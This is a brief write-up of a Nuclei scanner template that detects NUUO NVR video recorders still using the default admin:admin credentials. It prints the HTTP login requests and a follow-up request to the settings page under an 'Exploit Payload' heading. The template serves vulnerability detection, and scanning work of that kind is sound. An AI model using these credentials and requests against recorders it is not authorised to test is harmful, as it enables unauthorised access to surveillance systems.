# Nuclei Template: NUUO NVR - Default Login
**Template ID:** nuuo-nvr-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`nuuo-nvr-default-login.yaml`)

## Vulnerability Information & PoC

## Description
NUUO NVR systems are often deployed with default credentials (admin:admin).This template detects systems using these default credentials.

## Steps to reproduce / Exploit Payload
```http
GET /login.php HTTP/1.1
Host: {{Hostname}}

POST /login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

language=en&user={{username}}&pass={{password}}&submit=Login

GET /setting.php HTTP/1.1
Host: {{Hostname}}
```

## References
- http://www.nuuo.com/
